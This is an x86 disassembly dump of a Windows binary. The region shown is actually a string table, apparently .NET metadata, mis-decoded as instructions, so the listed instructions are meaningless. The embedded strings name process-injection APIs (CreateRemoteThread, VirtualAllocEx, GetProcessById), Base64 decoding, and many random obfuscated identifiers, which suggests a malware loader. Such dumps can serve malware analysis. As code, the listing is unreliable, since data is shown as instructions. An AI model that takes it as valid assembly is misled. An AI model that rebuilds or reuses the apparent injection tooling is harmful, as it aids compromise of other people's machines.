10003101:	63 62 00             	arpl   %esp,0x0(%edx)
10003104:	6d                   	insl   (%dx),%es:(%edi)
10003105:	73 63                	jae    0x1000316a
10003107:	6f                   	outsl  %ds:(%esi),(%dx)
10003108:	72 6c                	jb     0x10003176
1000310a:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
10003111:	53                   	push   %ebx
10003112:	79 73                	jns    0x10003187
10003114:	74 65                	je     0x1000317b
10003116:	6d                   	insl   (%dx),%es:(%edi)
10003117:	2e 43                	cs inc %ebx
10003119:	6f                   	outsl  %ds:(%esi),(%dx)
1000311a:	6c                   	insb   (%dx),%es:(%edi)
1000311b:	6c                   	insb   (%dx),%es:(%edi)
1000311c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
10003121:	6e                   	outsb  %ds:(%esi),(%dx)
10003122:	73 2e                	jae    0x10003152
10003124:	47                   	inc    %edi
10003125:	65 6e                	outsb  %gs:(%esi),(%dx)
10003127:	65 72 69             	gs jb  0x10003193
1000312a:	63 00                	arpl   %eax,(%eax)
1000312c:	4f                   	dec    %edi
1000312d:	7a 44                	jp     0x10003173
1000312f:	4c                   	dec    %esp
10003130:	61                   	popa
10003131:	45                   	inc    %ebp
10003132:	32 59 4b             	xor    0x4b(%ecx),%bl
10003135:	4e                   	dec    %esi
10003136:	58                   	pop    %eax
10003137:	70 71                	jo     0x100031aa
10003139:	63 00                	arpl   %eax,(%eax)
1000313b:	47                   	inc    %edi
1000313c:	65 74 50             	gs je  0x1000318f
1000313f:	72 6f                	jb     0x100031b0
10003141:	63 65 73             	arpl   %esp,0x73(%ebp)
10003144:	73 42                	jae    0x10003188
10003146:	79 49                	jns    0x10003191
10003148:	64 00 47 65          	add    %al,%fs:0x65(%edi)
1000314c:	74 45                	je     0x10003193
1000314e:	78 69                	js     0x100031b9
10003150:	74 43                	je     0x10003195
10003152:	6f                   	outsl  %ds:(%esi),(%dx)
10003153:	64 65 54             	fs gs push %esp
10003156:	68 72 65 61 64       	push   $0x64616572
1000315b:	00 43 72             	add    %al,0x72(%ebx)
1000315e:	65 61                	gs popa
10003160:	74 65                	je     0x100031c7
10003162:	52                   	push   %edx
10003163:	65 6d                	gs insl (%dx),%es:(%edi)
10003165:	6f                   	outsl  %ds:(%esi),(%dx)
10003166:	74 65                	je     0x100031cd
10003168:	54                   	push   %esp
10003169:	68 72 65 61 64       	push   $0x64616572
1000316e:	00 41 64             	add    %al,0x64(%ecx)
10003171:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
10003175:	74 5f                	je     0x100031d6
10003177:	48                   	dec    %eax
10003178:	61                   	popa
10003179:	73 45                	jae    0x100031c0
1000317b:	78 69                	js     0x100031e6
1000317d:	74 65                	je     0x100031e4
1000317f:	64 00 4b 44          	add    %cl,%fs:0x44(%ebx)
10003183:	79 76                	jns    0x100031fb
10003185:	51                   	push   %ecx
10003186:	74 69                	je     0x100031f1
10003188:	65 50                	gs push %eax
1000318a:	69 76 79 61 61 6b 33 	imul   $0x336b6161,0x79(%esi),%esi
10003191:	45                   	inc    %ebp
10003192:	55                   	push   %ebp
10003193:	45                   	inc    %ebp
10003194:	70 43                	jo     0x100031d9
10003196:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
1000319a:	70 6c                	jo     0x10003208
1000319c:	61                   	popa
1000319d:	63 65 00             	arpl   %esp,0x0(%ebp)
100031a0:	43                   	inc    %ebx
100031a1:	54                   	push   %esp
100031a2:	64 46                	fs inc %esi
100031a4:	48                   	dec    %eax
100031a5:	54                   	push   %esp
100031a6:	50                   	push   %eax
100031a7:	35 7a 63 71 58       	xor    $0x5871637a,%eax
100031ac:	70 63                	jo     0x10003211
100031ae:	6c                   	insb   (%dx),%es:(%edi)
100031af:	32 35 30 56 55 68    	xor    0x68555630,%dh
100031b5:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
100031b9:	75 6d                	jne    0x10003228
100031bb:	65 72 61             	gs jb  0x1000321f
100031be:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
100031c2:	43                   	inc    %ebx
100031c3:	6c                   	insb   (%dx),%es:(%edi)
100031c4:	6f                   	outsl  %ds:(%esi),(%dx)
100031c5:	73 65                	jae    0x1000322c
100031c7:	48                   	dec    %eax
100031c8:	61                   	popa
100031c9:	6e                   	outsb  %ds:(%esi),(%dx)
100031ca:	64 6c                	fs insb (%dx),%es:(%edi)
100031cc:	65 00 46 69          	add    %al,%gs:0x69(%esi)
100031d0:	6c                   	insb   (%dx),%es:(%edi)
100031d1:	65 00 66 69          	add    %ah,%gs:0x69(%esi)
100031d5:	6c                   	insb   (%dx),%es:(%edi)
100031d6:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
100031da:	6d                   	insl   (%dx),%es:(%edi)
100031db:	62 69 6e             	bound  %ebp,0x6e(%ecx)
100031de:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
100031e2:	6c                   	insb   (%dx),%es:(%edi)
100031e3:	75 65                	jne    0x1000324a
100031e5:	54                   	push   %esp
100031e6:	79 70                	jns    0x10003258
100031e8:	65 00 57 68          	add    %dl,%gs:0x68(%edi)
100031ec:	65 72 65             	gs jb  0x10003254
100031ef:	00 53 79             	add    %dl,0x79(%ebx)
100031f2:	73 74                	jae    0x10003268
100031f4:	65 6d                	gs insl (%dx),%es:(%edi)
100031f6:	2e 43                	cs inc %ebx
100031f8:	6f                   	outsl  %ds:(%esi),(%dx)
100031f9:	72 65                	jb     0x10003260
100031fb:	00 43 6f             	add    %al,0x6f(%ebx)
100031fe:	6d                   	insl   (%dx),%es:(%edi)
100031ff:	70 69                	jo     0x1000326a
10003201:	6c                   	insb   (%dx),%es:(%edi)
10003202:	65 72 47             	gs jb  0x1000324c
10003205:	65 6e                	outsb  %gs:(%esi),(%dx)
10003207:	65 72 61             	gs jb  0x1000326b
1000320a:	74 65                	je     0x10003271
1000320c:	64 41                	fs inc %ecx
1000320e:	74 74                	je     0x10003284
10003210:	72 69                	jb     0x1000327b
10003212:	62 75 74             	bound  %esi,0x74(%ebp)
10003215:	65 00 47 75          	add    %al,%gs:0x75(%edi)
10003219:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
10003220:	62 
10003221:	75 74                	jne    0x10003297
10003223:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
10003228:	75 67                	jne    0x10003291
1000322a:	67 61                	addr16 popa
1000322c:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
10003230:	74 74                	je     0x100032a6
10003232:	72 69                	jb     0x1000329d
10003234:	62 75 74             	bound  %esi,0x74(%ebp)
10003237:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
1000323b:	6d                   	insl   (%dx),%es:(%edi)
1000323c:	56                   	push   %esi
1000323d:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
10003244:	74 74                	je     0x100032ba
10003246:	72 69                	jb     0x100032b1
10003248:	62 75 74             	bound  %esi,0x74(%ebp)
1000324b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
1000324f:	73 65                	jae    0x100032b6
10003251:	6d                   	insl   (%dx),%es:(%edi)
10003252:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10003256:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
1000325d:	72 
1000325e:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
10003265:	73 73                	jae    0x100032da
10003267:	65 6d                	gs insl (%dx),%es:(%edi)
10003269:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
1000326d:	72 61                	jb     0x100032d0
1000326f:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
10003272:	61                   	popa
10003273:	72 6b                	jb     0x100032e0
10003275:	41                   	inc    %ecx
10003276:	74 74                	je     0x100032ec
10003278:	72 69                	jb     0x100032e3
1000327a:	62 75 74             	bound  %esi,0x74(%ebp)
1000327d:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
10003282:	67 65 74 46          	addr16 gs je 0x100032cc
10003286:	72 61                	jb     0x100032e9
10003288:	6d                   	insl   (%dx),%es:(%edi)
10003289:	65 77 6f             	gs ja  0x100032fb
1000328c:	72 6b                	jb     0x100032f9
1000328e:	41                   	inc    %ecx
1000328f:	74 74                	je     0x10003305
10003291:	72 69                	jb     0x100032fc
10003293:	62 75 74             	bound  %esi,0x74(%ebp)
10003296:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
1000329a:	73 65                	jae    0x10003301
1000329c:	6d                   	insl   (%dx),%es:(%edi)
1000329d:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
100032a1:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
100032a8:	69 
100032a9:	6f                   	outsl  %ds:(%esi),(%dx)
100032aa:	6e                   	outsb  %ds:(%esi),(%dx)
100032ab:	41                   	inc    %ecx
100032ac:	74 74                	je     0x10003322
100032ae:	72 69                	jb     0x10003319
100032b0:	62 75 74             	bound  %esi,0x74(%ebp)
100032b3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
100032b7:	73 65                	jae    0x1000331e
100032b9:	6d                   	insl   (%dx),%es:(%edi)
100032ba:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
100032be:	6f                   	outsl  %ds:(%esi),(%dx)
100032bf:	6e                   	outsb  %ds:(%esi),(%dx)
100032c0:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
100032c6:	74 69                	je     0x10003331
100032c8:	6f                   	outsl  %ds:(%esi),(%dx)
100032c9:	6e                   	outsb  %ds:(%esi),(%dx)
100032ca:	41                   	inc    %ecx
100032cb:	74 74                	je     0x10003341
100032cd:	72 69                	jb     0x10003338
100032cf:	62 75 74             	bound  %esi,0x74(%ebp)
100032d2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
100032d6:	73 65                	jae    0x1000333d
100032d8:	6d                   	insl   (%dx),%es:(%edi)
100032d9:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
100032dd:	65 73 63             	gs jae 0x10003343
100032e0:	72 69                	jb     0x1000334b
100032e2:	70 74                	jo     0x10003358
100032e4:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
100032eb:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
100032f2:	6f                   	outsl  %ds:(%esi),(%dx)
100032f3:	6d                   	insl   (%dx),%es:(%edi)
100032f4:	70 69                	jo     0x1000335f
100032f6:	6c                   	insb   (%dx),%es:(%edi)
100032f7:	61                   	popa
100032f8:	74 69                	je     0x10003363
100032fa:	6f                   	outsl  %ds:(%esi),(%dx)
100032fb:	6e                   	outsb  %ds:(%esi),(%dx)
100032fc:	52                   	push   %edx
100032fd:	65 6c                	gs insb (%dx),%es:(%edi)
100032ff:	61                   	popa
10003300:	78 61                	js     0x10003363
10003302:	74 69                	je     0x1000336d
10003304:	6f                   	outsl  %ds:(%esi),(%dx)
10003305:	6e                   	outsb  %ds:(%esi),(%dx)
10003306:	73 41                	jae    0x10003349
10003308:	74 74                	je     0x1000337e
1000330a:	72 69                	jb     0x10003375
1000330c:	62 75 74             	bound  %esi,0x74(%ebp)
1000330f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10003313:	73 65                	jae    0x1000337a
10003315:	6d                   	insl   (%dx),%es:(%edi)
10003316:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
1000331a:	72 6f                	jb     0x1000338b
1000331c:	64 75 63             	fs jne 0x10003382
1000331f:	74 41                	je     0x10003362
10003321:	74 74                	je     0x10003397
10003323:	72 69                	jb     0x1000338e
10003325:	62 75 74             	bound  %esi,0x74(%ebp)
10003328:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
1000332c:	73 65                	jae    0x10003393
1000332e:	6d                   	insl   (%dx),%es:(%edi)
1000332f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10003333:	6f                   	outsl  %ds:(%esi),(%dx)
10003334:	70 79                	jo     0x100033af
10003336:	72 69                	jb     0x100033a1
10003338:	67 68 74 41 74 74    	addr16 push $0x74744174
1000333e:	72 69                	jb     0x100033a9
10003340:	62 75 74             	bound  %esi,0x74(%ebp)
10003343:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10003347:	73 65                	jae    0x100033ae
10003349:	6d                   	insl   (%dx),%es:(%edi)
1000334a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
1000334e:	6f                   	outsl  %ds:(%esi),(%dx)
1000334f:	6d                   	insl   (%dx),%es:(%edi)
10003350:	70 61                	jo     0x100033b3
10003352:	6e                   	outsb  %ds:(%esi),(%dx)
10003353:	79 41                	jns    0x10003396
10003355:	74 74                	je     0x100033cb
10003357:	72 69                	jb     0x100033c2
10003359:	62 75 74             	bound  %esi,0x74(%ebp)
1000335c:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
10003360:	6e                   	outsb  %ds:(%esi),(%dx)
10003361:	74 69                	je     0x100033cc
10003363:	6d                   	insl   (%dx),%es:(%edi)
10003364:	65 43                	gs inc %ebx
10003366:	6f                   	outsl  %ds:(%esi),(%dx)
10003367:	6d                   	insl   (%dx),%es:(%edi)
10003368:	70 61                	jo     0x100033cb
1000336a:	74 69                	je     0x100033d5
1000336c:	62 69 6c             	bound  %ebp,0x6c(%ecx)
1000336f:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
10003376:	69 
10003377:	62 75 74             	bound  %esi,0x74(%ebp)
1000337a:	65 00 53 69          	add    %dl,%gs:0x69(%ebx)
1000337e:	7a 65                	jp     0x100033e5
10003380:	4f                   	dec    %edi
10003381:	66 00 53 79          	data16 add %dl,0x79(%ebx)
10003385:	73 74                	jae    0x100033fb
10003387:	65 6d                	gs insl (%dx),%es:(%edi)
10003389:	2e 54                	cs push %esp
1000338b:	68 72 65 61 64       	push   $0x64616572
10003390:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
10003397:	6f                   	outsl  %ds:(%esi),(%dx)
10003398:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
1000339f:	73 
100033a0:	74 65                	je     0x10003407
100033a2:	6d                   	insl   (%dx),%es:(%edi)
100033a3:	2e 52                	cs push %edx
100033a5:	75 6e                	jne    0x10003415
100033a7:	74 69                	je     0x10003412
100033a9:	6d                   	insl   (%dx),%es:(%edi)
100033aa:	65 2e 56             	gs cs push %esi
100033ad:	65 72 73             	gs jb  0x10003423
100033b0:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
100033b7:	46                   	inc    %esi
100033b8:	72 6f                	jb     0x10003429
100033ba:	6d                   	insl   (%dx),%es:(%edi)
100033bb:	42                   	inc    %edx
100033bc:	61                   	popa
100033bd:	73 65                	jae    0x10003424
100033bf:	36 34 53             	ss xor $0x53,%al
100033c2:	74 72                	je     0x10003436
100033c4:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
100033cb:	53                   	push   %ebx
100033cc:	74 72                	je     0x10003440
100033ce:	69 6e 67 00 50 61 74 	imul   $0x74615000,0x67(%esi),%ebp
100033d5:	68 00 67 65 74       	push   $0x74656700
100033da:	5f                   	pop    %edi
100033db:	4c                   	dec    %esp
100033dc:	65 6e                	outsb  %gs:(%esi),(%dx)
100033de:	67 74 68             	addr16 je 0x10003449
100033e1:	00 51 66             	add    %dl,0x66(%ecx)
100033e4:	6b 6c 43 6b 64       	imul   $0x64,0x6b(%ebx,%eax,2),%ebp
100033e9:	6b 6f 6c 35          	imul   $0x35,0x6c(%edi),%ebp
100033ed:	55                   	push   %ebp
100033ee:	52                   	push   %edx
100033ef:	46                   	inc    %esi
100033f0:	33 4b 6f             	xor    0x6f(%ebx),%ecx
100033f3:	34 4e                	xor    $0x4e,%al
100033f5:	68 75 64 58 78       	push   $0x78586475
100033fa:	68 00 57 49 64       	push   $0x64495700
100033ff:	7a 67                	jp     0x10003468
10003401:	73 41                	jae    0x10003444
10003403:	57                   	push   %edi
10003404:	6b 36 6b             	imul   $0x6b,(%esi),%esi
10003407:	64 33 6d 75          	xor    %fs:0x75(%ebp),%ebp
1000340b:	52                   	push   %edx
1000340c:	35 33 44 6b 00       	xor    $0x6b4433,%eax
10003411:	4c                   	dec    %esp
10003412:	6a 6a                	push   $0x6a
10003414:	69 76 45 6f 55 46 56 	imul   $0x5646556f,0x45(%esi),%esi
1000341b:	62 6e 48             	bound  %ebp,0x48(%esi)
1000341e:	59                   	pop    %ecx
1000341f:	34 71                	xor    $0x71,%al
10003421:	34 30                	xor    $0x30,%al
10003423:	46                   	inc    %esi
10003424:	74 6b                	je     0x10003491
10003426:	00 4d 61             	add    %cl,0x61(%ebp)
10003429:	72 73                	jb     0x1000349e
1000342b:	68 61 6c 00 6b       	push   $0x6b006c61
10003430:	65 72 6e             	gs jb  0x100034a1
10003433:	65 6c                	gs insb (%dx),%es:(%edi)
10003435:	33 32                	xor    (%edx),%esi
10003437:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
1000343a:	6c                   	insb   (%dx),%es:(%edi)
1000343b:	00 42 6b             	add    %al,0x6b(%edx)
1000343e:	76 73                	jbe    0x100034b3
10003440:	6c                   	insb   (%dx),%es:(%edi)
10003441:	4f                   	dec    %edi
10003442:	44                   	inc    %esp
10003443:	30 39                	xor    %bh,(%ecx)
10003445:	79 57                	jns    0x1000349e
10003447:	75 6d                	jne    0x100034b6
10003449:	71 2e                	jno    0x10003479
1000344b:	64 6c                	fs insb (%dx),%es:(%edi)
1000344d:	6c                   	insb   (%dx),%es:(%edi)
1000344e:	00 4b 69             	add    %cl,0x69(%ebx)
10003451:	6c                   	insb   (%dx),%es:(%edi)
10003452:	6c                   	insb   (%dx),%es:(%edi)
10003453:	00 50 79             	add    %dl,0x79(%eax)
10003456:	77 57                	ja     0x100034af
10003458:	6b 6a 55 37          	imul   $0x37,0x55(%edx),%ebp
1000345c:	77 30                	ja     0x1000348e
1000345e:	78 31                	js     0x10003491
10003460:	6d                   	insl   (%dx),%es:(%edi)
10003461:	57                   	push   %edi
10003462:	54                   	push   %esp
10003463:	4c                   	dec    %esp
10003464:	6e                   	outsb  %ds:(%esi),(%dx)
10003465:	65 43                	gs inc %ebx
10003467:	70 6c                	jo     0x100034d5
10003469:	33 33                	xor    (%ebx),%esi
1000346b:	4c                   	dec    %esp
1000346c:	6d                   	insl   (%dx),%es:(%edi)
1000346d:	00 53 79             	add    %dl,0x79(%ebx)
10003470:	73 74                	jae    0x100034e6
10003472:	65 6d                	gs insl (%dx),%es:(%edi)
10003474:	00 52 61             	add    %dl,0x61(%edx)
10003477:	6e                   	outsb  %ds:(%esi),(%dx)
10003478:	64 6f                	outsl  %fs:(%esi),(%dx)
1000347a:	6d                   	insl   (%dx),%es:(%edi)
1000347b:	00 58 70             	add    %bl,0x70(%eax)
1000347e:	6e                   	outsb  %ds:(%esi),(%dx)
1000347f:	4b                   	dec    %ebx
10003480:	44                   	inc    %esp
10003481:	63 37                	arpl   %esi,(%edi)
10003483:	46                   	inc    %esi
10003484:	57                   	push   %edi
10003485:	64 49                	fs dec %ecx
10003487:	56                   	push   %esi
10003488:	5a                   	pop    %edx
10003489:	49                   	dec    %ecx
1000348a:	65 55                	gs push %ebp
1000348c:	34 31                	xor    $0x31,%al
1000348e:	72 37                	jb     0x100034c7
10003490:	5a                   	pop    %edx
10003491:	50                   	push   %eax
10003492:	68 44 6e 00 47       	push   $0x47006e44
10003497:	65 74 46             	gs je  0x100034e0
1000349a:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
100034a1:	57 
100034a2:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
100034a9:	78 
100034aa:	74 65                	je     0x10003511
100034ac:	6e                   	outsb  %ds:(%esi),(%dx)
100034ad:	73 69                	jae    0x10003518
100034af:	6f                   	outsl  %ds:(%esi),(%dx)
100034b0:	6e                   	outsb  %ds:(%esi),(%dx)
100034b1:	00 53 79             	add    %dl,0x79(%ebx)
100034b4:	73 74                	jae    0x1000352a
100034b6:	65 6d                	gs insl (%dx),%es:(%edi)
100034b8:	2e 52                	cs push %edx
100034ba:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
100034bd:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
100034c2:	6e                   	outsb  %ds:(%esi),(%dx)
100034c3:	00 53 65             	add    %dl,0x65(%ebx)
100034c6:	61                   	popa
100034c7:	72 63                	jb     0x1000352c
100034c9:	68 4f 70 74 69       	push   $0x6974704f
100034ce:	6f                   	outsl  %ds:(%esi),(%dx)
100034cf:	6e                   	outsb  %ds:(%esi),(%dx)
100034d0:	00 45 78             	add    %al,0x78(%ebp)
100034d3:	63 65 70             	arpl   %esp,0x70(%ebp)
100034d6:	74 69                	je     0x10003541
100034d8:	6f                   	outsl  %ds:(%esi),(%dx)
100034d9:	6e                   	outsb  %ds:(%esi),(%dx)
100034da:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
100034de:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
100034e3:	79 49                	jns    0x1000352e
100034e5:	6e                   	outsb  %ds:(%esi),(%dx)
100034e6:	66 6f                	outsw  %ds:(%esi),(%dx)
100034e8:	00 5a 65             	add    %bl,0x65(%edx)
100034eb:	72 6f                	jb     0x1000355c
100034ed:	00 53 6c             	add    %dl,0x6c(%ebx)
100034f0:	65 65 70 00          	gs gs jo 0x100034f4
100034f4:	45                   	inc    %ebp
100034f5:	42                   	inc    %edx
100034f6:	4e                   	dec    %esi
100034f7:	77 6f                	ja     0x10003568
100034f9:	56                   	push   %esi
100034fa:	59                   	pop    %ecx
100034fb:	73 76                	jae    0x10003573
100034fd:	69 68 69 51 44 52 47 	imul   $0x47524451,0x69(%eax),%ebp
10003504:	74 4d                	je     0x10003553
10003506:	57                   	push   %edi
10003507:	41                   	inc    %ecx
10003508:	62 71 00             	bound  %esi,0x0(%ecx)
1000350b:	42                   	inc    %edx
1000350c:	6b 76 73 6c          	imul   $0x6c,0x73(%esi),%esi
10003510:	4f                   	dec    %edi
10003511:	44                   	inc    %esp
10003512:	30 39                	xor    %bh,(%ecx)
10003514:	79 57                	jns    0x1000356d
10003516:	75 6d                	jne    0x10003585
10003518:	71 00                	jno    0x1000351a
1000351a:	53                   	push   %ebx
1000351b:	79 73                	jns    0x10003590
1000351d:	74 65                	je     0x10003584
1000351f:	6d                   	insl   (%dx),%es:(%edi)
10003520:	2e 4c                	cs dec %esp
10003522:	69 6e 71 00 2e 63 74 	imul   $0x74632e00,0x71(%esi),%ebp
10003529:	6f                   	outsl  %ds:(%esi),(%dx)
1000352a:	72 00                	jb     0x1000352c
1000352c:	2e 63 63 74          	arpl   %esp,%cs:0x74(%ebx)
10003530:	6f                   	outsl  %ds:(%esi),(%dx)
10003531:	72 00                	jb     0x10003533
10003533:	49                   	dec    %ecx
10003534:	6e                   	outsb  %ds:(%esi),(%dx)
10003535:	74 50                	je     0x10003587
10003537:	74 72                	je     0x100035ab
10003539:	00 58 41             	add    %bl,0x41(%eax)
1000353c:	47                   	inc    %edi
1000353d:	75 73                	jne    0x100035b2
1000353f:	47                   	inc    %edi
10003540:	65 79 53             	gs jns 0x10003596
10003543:	47                   	inc    %edi
10003544:	46                   	inc    %esi
10003545:	46                   	inc    %esi
10003546:	62 63 4d             	bound  %esp,0x4d(%ebx)
10003549:	35 50 72 45 73       	xor    $0x73457250,%eax
1000354e:	00 49 48             	add    %cl,0x48(%ecx)
10003551:	43                   	inc    %ebx
10003552:	6f                   	outsl  %ds:(%esi),(%dx)
10003553:	74 43                	je     0x10003598
10003555:	52                   	push   %edx
10003556:	70 77                	jo     0x100035cf
10003558:	61                   	popa
10003559:	63 59 39             	arpl   %ebx,0x39(%ecx)
1000355c:	66 57                	push   %di
1000355e:	49                   	dec    %ecx
1000355f:	73 00                	jae    0x10003561
10003561:	53                   	push   %ebx
10003562:	79 73                	jns    0x100035d7
10003564:	74 65                	je     0x100035cb
10003566:	6d                   	insl   (%dx),%es:(%edi)
10003567:	2e 44                	cs inc %esp
10003569:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
10003570:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
10003577:	74 65                	je     0x100035de
10003579:	6d                   	insl   (%dx),%es:(%edi)
1000357a:	2e 52                	cs push %edx
1000357c:	75 6e                	jne    0x100035ec
1000357e:	74 69                	je     0x100035e9
10003580:	6d                   	insl   (%dx),%es:(%edi)
10003581:	65 2e 49             	gs cs dec %ecx
10003584:	6e                   	outsb  %ds:(%esi),(%dx)
10003585:	74 65                	je     0x100035ec
10003587:	72 6f                	jb     0x100035f8
10003589:	70 53                	jo     0x100035de
1000358b:	65 72 76             	gs jb  0x10003604
1000358e:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
10003595:	73 74                	jae    0x1000360b
10003597:	65 6d                	gs insl (%dx),%es:(%edi)
10003599:	2e 52                	cs push %edx
1000359b:	75 6e                	jne    0x1000360b
1000359d:	74 69                	je     0x10003608
1000359f:	6d                   	insl   (%dx),%es:(%edi)
100035a0:	65 2e 43             	gs cs inc %ebx
100035a3:	6f                   	outsl  %ds:(%esi),(%dx)
100035a4:	6d                   	insl   (%dx),%es:(%edi)
100035a5:	70 69                	jo     0x10003610
100035a7:	6c                   	insb   (%dx),%es:(%edi)
100035a8:	65 72 53             	gs jb  0x100035fe
100035ab:	65 72 76             	gs jb  0x10003624
100035ae:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
100035b5:	62 75 67             	bound  %esi,0x67(%ebp)
100035b8:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
100035bf:	65 
100035c0:	73 00                	jae    0x100035c2
100035c2:	47                   	inc    %edi
100035c3:	65 74 46             	gs je  0x1000360c
100035c6:	69 6c 65 73 00 43 6f 	imul   $0x6e6f4300,0x73(%ebp,%eiz,2),%ebp
100035cd:	6e 
100035ce:	74 61                	je     0x10003631
100035d0:	69 6e 73 00 67 65 74 	imul   $0x74656700,0x73(%esi),%ebp
100035d7:	5f                   	pop    %edi
100035d8:	43                   	inc    %ebx
100035d9:	68 61 72 73 00       	push   $0x737261
100035de:	43                   	inc    %ebx
100035df:	72 65                	jb     0x10003646
100035e1:	61                   	popa
100035e2:	74 65                	je     0x10003649
100035e4:	50                   	push   %eax
100035e5:	72 6f                	jb     0x10003656
100035e7:	63 65 73             	arpl   %esp,0x73(%ebp)
100035ea:	73 00                	jae    0x100035ec
100035ec:	43                   	inc    %ebx
100035ed:	6f                   	outsl  %ds:(%esi),(%dx)
100035ee:	6e                   	outsb  %ds:(%esi),(%dx)
100035ef:	63 61 74             	arpl   %esp,0x74(%ecx)
100035f2:	00 52 65             	add    %dl,0x65(%edx)
100035f5:	70 65                	jo     0x1000365c
100035f7:	61                   	popa
100035f8:	74 00                	je     0x100035fa
100035fa:	4f                   	dec    %edi
100035fb:	62 6a 65             	bound  %ebp,0x65(%edx)
100035fe:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
10003602:	65 6c                	gs insb (%dx),%es:(%edi)
10003604:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
10003609:	6f                   	outsl  %ds:(%esi),(%dx)
1000360a:	6e                   	outsb  %ds:(%esi),(%dx)
1000360b:	76 65                	jbe    0x10003672
1000360d:	72 74                	jb     0x10003683
1000360f:	00 4e 65             	add    %cl,0x65(%esi)
10003612:	78 74                	js     0x10003688
10003614:	00 53 79             	add    %dl,0x79(%ebx)
10003617:	73 74                	jae    0x1000368d
10003619:	65 6d                	gs insl (%dx),%es:(%edi)
1000361b:	2e 54                	cs push %esp
1000361d:	65 78 74             	gs js  0x10003694
10003620:	00 5a 51             	add    %bl,0x51(%edx)
10003623:	73 75                	jae    0x1000369a
10003625:	75 48                	jne    0x1000366f
10003627:	6c                   	insb   (%dx),%es:(%edi)
10003628:	62 70 69             	bound  %esi,0x69(%eax)
1000362b:	4c                   	dec    %esp
1000362c:	58                   	pop    %eax
1000362d:	44                   	inc    %esp
1000362e:	7a 4e                	jp     0x1000367e
10003630:	36 55                	ss push %ebp
10003632:	75 00                	jne    0x10003634
10003634:	56                   	push   %esi
10003635:	69 72 74 75 61 6c 41 	imul   $0x416c6175,0x74(%edx),%esi
1000363c:	6c                   	insb   (%dx),%es:(%edi)
1000363d:	6c                   	insb   (%dx),%es:(%edi)
1000363e:	6f                   	outsl  %ds:(%esi),(%dx)
1000363f:	63 45 78             	arpl   %eax,0x78(%ebp)
10003642:	00 45 43             	add    %al,0x43(%ebp)
10003645:	4f                   	dec    %edi
10003646:	61                   	popa
10003647:	55                   	push   %ebp
10003648:	72 53                	jb     0x1000369d
1000364a:	4a                   	dec    %edx
1000364b:	5a                   	pop    %edx
1000364c:	49                   	dec    %ecx
1000364d:	44                   	inc    %esp
1000364e:	69 7a 51 4c 65 52 77 	imul   $0x7752654c,0x51(%edx),%edi
10003655:	55                   	push   %ebp
10003656:	6e                   	outsb  %ds:(%esi),(%dx)
10003657:	78 00                	js     0x10003659
10003659:	53                   	push   %ebx
1000365a:	76 6c                	jbe    0x100036c8
1000365c:	74 4b                	je     0x100036a9
1000365e:	79 39                	jns    0x10003699
